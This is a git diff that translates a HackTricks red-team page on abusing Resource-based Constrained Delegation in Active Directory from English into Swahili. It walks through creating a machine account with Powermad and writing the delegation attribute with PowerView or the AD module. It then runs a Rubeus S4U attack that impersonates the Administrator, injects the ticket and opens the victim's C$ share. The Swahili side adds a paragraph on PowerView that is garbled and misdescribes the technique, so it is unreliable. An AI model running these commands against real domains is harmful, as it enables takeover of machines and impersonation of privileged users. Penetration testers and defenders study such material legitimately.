@@ -1,60 +1,57 @@
-# Resource-based Constrained Delegation
+# Utekelezaji wa Kikomo cha Utekelezaji kwa Msingi wa Raslimali
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-## Basics of Resource-based Constrained Delegation
+## Misingi ya Kikomo cha Utekelezaji kwa Msingi wa Raslimali
 
-This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
+Hii ni sawa na [Utekelezaji wa Kikomo](constrained-delegation.md) lakini **badala yake** ya kutoa ruhusa kwa **kitu** kuwa **wakilishi wa mtumiaji yeyote dhidi ya huduma**. Kikomo cha Utekelezaji kwa Msingi wa Raslimali **hukiweka** katika **kitu ni nani anayeweza kuwa wakilishi wa mtumiaji yeyote dhidi yake**.
 
-In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.
+Katika kesi hii, kitu kilichopunguzwa kitakuwa na sifa inayoitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ na jina la mtumiaji ambaye anaweza kuwa wakilishi wa mtumiaji mwingine yeyote dhidi yake.
 
-Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (In the other forms of Delegation you needed domain admin privs).
+Tofauti muhimu nyingine kati ya Utekelezaji huu wa Kikomo na utekelezaji mwingine ni kwamba mtumiaji yeyote mwenye **ruhusa ya kuandika juu ya akaunti ya kompyuta** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/n.k_) anaweza kuweka _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Katika aina nyingine za Utekelezaji, unahitaji uwezo wa msimamizi wa kikoa).
 
-### New Concepts
+### Dhana Mpya
 
-Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
-The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.
+Katika Utekelezaji wa Kikomo, ilisemwa kuwa bendera ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika kufanya **S4U2Self.** Lakini hiyo sio ukweli kamili.\
+Ukweli ni kwamba hata bila thamani hiyo, unaweza kufanya **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **huduma** (una SPN) lakini, ikiwa una **`TrustedToAuthForDelegation`** TGS iliyorejeshwa itakuwa **inayoweza kupelekwa** na ikiwa **huna** bendera hiyo TGS iliyorejeshwa **haitakuwa** inayoweza kupelekwa.
 
-However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work** (this is not a vulnerability, it's a feature, apparently).
+Walakini, ikiwa **TGS** inayotumiwa katika **S4U2Proxy** **HAIWEZI kupelekwa** jaribio la kudukua **Utekelezaji wa Kikomo wa Kawaida** **halitafanya kazi**. Lakini ikiwa unajaribu kudukua **Utekelezaji wa Kikomo kwa Msingi wa Raslimali, itafanya kazi** (hii sio udhaifu, ni kipengele, kwa kuonekana).
 
-### Attack structure
+### Muundo wa Shambulio
 
-> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.
+> Ikiwa una **ruhusa sawa na kuandika** juu ya akaunti ya **Kompyuta** unaweza kupata **upatikanaji wa haki** kwenye kompyuta hiyo.
 
-Suppose that the attacker has already **write equivalent privileges over the victim computer**.
+Fikiria kuwa mshambuliaji tayari ana **ruhusa sawa na kuandika** juu ya kompyuta ya mwathirika.
 
-1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 **Computer objects (**_**MachineAccountQuota**_**)** and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
-2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
-3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
-   1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
-   2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
-   3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
-4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim ServiceB**.
+1. Mshambuliaji **anadukua** akaunti ambayo ina **SPN** au **inaunda moja** ("Huduma A"). Kumbuka kwamba **mtumiaji yeyote** wa _Admin_ bila haki maalum nyingine yoyote anaweza **kuunda** hadi 10 **vitu vya Kompyuta (**_**MachineAccountQuota**_**)** na kuweka SPN. Kwa hivyo mshambuliaji anaweza tu kuunda kitu cha Kompyuta na kuweka SPN.
+2. Mshambuliaji **anatumia ruhusa yake ya KUANDIKA** juu ya kompyuta ya mwathirika (HudumaB) kuwezesha **utekelezaji uliopunguzwa kwa msingi wa raslimali kuruhusu HudumaA kuwa wakilishi wa mtumiaji yeyote** dhidi ya kompyuta hiyo ya mwathirika (HudumaB).
+3. Mshambuliaji anatumia Rubeus kufanya **shambulio kamili la S4U** (S4U2Self na S4U2Proxy) kutoka Huduma A kwenda Huduma B kwa mtumiaji **mwenye upatikanaji wa haki kwenye Huduma B**.
+1. S4U2Self (kutoka akaunti iliyodukuliwa/iliyoundwa ya SPN): Uliza TGS ya **Msimamizi kwangu** (Isiyoweza kupelekwa).
+2. S4U2Proxy: Tumia TGS **isiyoweza kupelekwa** ya hatua iliyotangulia kuomba TGS kutoka **Msimamizi** kwenda **mwenyeji wa mwathirika**.
+3. Hata ikiwa unatumia TGS isiyoweza kupelekwa, kwa kuwa unatumia utekelezaji uliopunguzwa kwa msingi wa raslimali, itafanya kazi.
+4. Mshambuliaji anaweza **kupitisha tiketi** na **kuwa wakilishi** wa mtumiaji ili kupata **upatikanaji wa HudumaB**.
 
-To check the _**MachineAccountQuota**_ of the domain you can use:
-
+Ili kuchunguza _**MachineAccountQuota**_ ya kikoa, unaweza kutumia:
 ```powershell
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
+## Shambulizi
 
-## Attack
+### Kuunda Kitu cha Kompyuta
 
-### Creating a Computer Object
-
-You can create a computer object inside the domain using [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-
+Unaweza kuunda kitu cha kompyuta ndani ya kikoa kwa kutumia [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -62,18 +59,27 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
+### Kuwezesha Utekelezaji wa Rasilimali kwa Kizuizi
 
-### Configuring R**esource-based Constrained Delegation**
-
-**Using activedirectory PowerShell module**
-
+**Kutumia moduli ya PowerShell ya activedirectory**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
+**Kutumia powerview**
 
-**Using powerview**
+Powerview ni zana yenye nguvu ya PowerShell ambayo inaweza kutumiwa kuchunguza na kuchunguza mazingira ya Active Directory. Inatoa uwezo wa kufanya kazi na vipengele vya Active Directory kwa urahisi na kwa ufanisi.
 
+Kwa kutumia Powerview, unaweza kutekeleza mbinu mbalimbali za kudhibiti rasilimali kwenye mfumo wa Active Directory. Hii ni pamoja na kutekeleza mbinu za kudhibiti rasilimali zilizopunguzwa (constrained delegation) ambazo zinaweza kusaidia katika kudhibiti ufikiaji wa rasilimali kwa watumiaji fulani.
+
+Kwa kufuata hatua zifuatazo, unaweza kutumia Powerview kutekeleza mbinu za kudhibiti rasilimali zilizopunguzwa:
+
+1. Tumia amri ya PowerShell `Import-Module .\PowerView.ps1` ili kuagiza Powerview.
+2. Tumia amri ya PowerShell `Get-DomainUser -Identity <username>` ili kupata habari za mtumiaji wa kikoa.
+3. Tumia amri ya PowerShell `Get-DomainComputer -Identity <computername>` ili kupata habari za kompyuta ya kikoa.
+4. Tumia amri ya PowerShell `Set-DomainObject -Identity <object> -Add @{'msDS-AllowedToDelegateTo'="<target>"} -Verbose` ili kuwezesha kudhibiti rasilimali zilizopunguzwa kwa lengo fulani.
+
+Kwa kufuata hatua hizi, unaweza kutumia Powerview kutekeleza mbinu za kudhibiti rasilimali zilizopunguzwa kwenye mfumo wa Active Directory. Hii inaweza kuwa na manufaa katika kudhibiti ufikiaji wa rasilimali kwa watumiaji wanaohusika.
 ```powershell
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -88,56 +94,47 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
+### Kutekeleza shambulio kamili la S4U
 
-### Performing a complete S4U attack
-
-First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
-
+Kwanza kabisa, tumeunda kitu kipya cha Kompyuta na nenosiri `123456`, hivyo tunahitaji hash ya nenosiri hilo:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-
-This will print the RC4 and AES hashes for that account.\
-Now, the attack can be performed:
-
+Hii itaonyesha RC4 na AES hashes kwa akaunti hiyo.\
+Sasa, shambulio linaweza kutekelezwa:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-
-You can generate more tickets just asking once using the `/altservice` param of Rubeus:
-
+Unaweza kuzalisha tiketi zaidi kwa kuuliza mara moja tu kwa kutumia `/altservice` paramu ya Rubeus:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
-
 {% hint style="danger" %}
-Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
+Tafadhali kumbuka kuwa watumiaji wana sifa inayoitwa "**Haiwezi kupelekwa**". Ikiwa mtumiaji ana sifa hii kuwa ya kweli, hautaweza kujifanya kuwa yeye. Mali hii inaweza kuonekana ndani ya bloodhound.
 {% endhint %}
 
-### Accessing
+### Kupata
 
-The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\
-In this example it was requested a TGS for the **CIFS** service from Administrator, so you will be able to access **C$**:
-
+Amri ya mwisho itatekeleza **shambulio kamili la S4U na kuingiza TGS** kutoka kwa Msimamizi kwenda kwa mwenyeji wa mwathirika katika **kumbukumbu**.\
+Katika mfano huu, TGS ilihitajika kwa huduma ya **CIFS** kutoka kwa Msimamizi, kwa hivyo utaweza kupata **C$**:
 ```bash
 ls \\victim.domain.local\C$
 ```
+### Matumizi ya tiketi za huduma tofauti
 
-### Abuse different service tickets
+Jifunze kuhusu [**tiketi za huduma zinazopatikana hapa**](silver-ticket.md#available-services).
 
-Lear about the [**available service tickets here**](silver-ticket.md#available-services).
+## Makosa ya Kerberos
 
-## Kerberos Errors
+* **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa Kerberos imeundwa kutokutumia DES au RC4 na unatoa tu hash ya RC4. Toa angalau hash ya AES256 kwa Rubeus (au toa tu hash za rc4, aes128, na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+* **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa wakati wa kompyuta ya sasa ni tofauti na wakati wa DC na Kerberos haifanyi kazi vizuri.
+* **`preauth_failed`**: Hii inamaanisha kuwa jina la mtumiaji + hash zilizotolewa hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya jina la mtumiaji wakati wa kuzalisha hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+* **`KDC_ERR_BADOPTION`**: Hii inaweza maana:
+* Mtumiaji unayejaribu kujifanya hawezi kupata huduma inayotakiwa (kwa sababu huwezi kujifanya au kwa sababu haina vya kutosha)
+* Huduma iliyoombwa haipo (ikiwa unauliza tiketi kwa winrm lakini winrm haifanyi kazi)
+* Kompyuta bandia iliyoundwa imepoteza mamlaka yake juu ya seva inayoweza kudhurika na unahitaji kuirudisha.
 
-* **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-* **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
-* **`preauth_failed`**: This means that the given username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-* **`KDC_ERR_BADOPTION`**: This may mean:
-  * The user you are trying to impersonate cannot access the desired service (because you cannot impersonate it or because it doesn't have enough privileges)
-  * The asked service doesn't exist (if you ask for a ticket for winrm but winrm isn't running)
-  * The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
-
-## References
+## Marejeo
 
 * [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 * [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
@@ -146,14 +143,14 @@ Lear about the [**available service tickets here**](silver-ticket.md#available-s
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
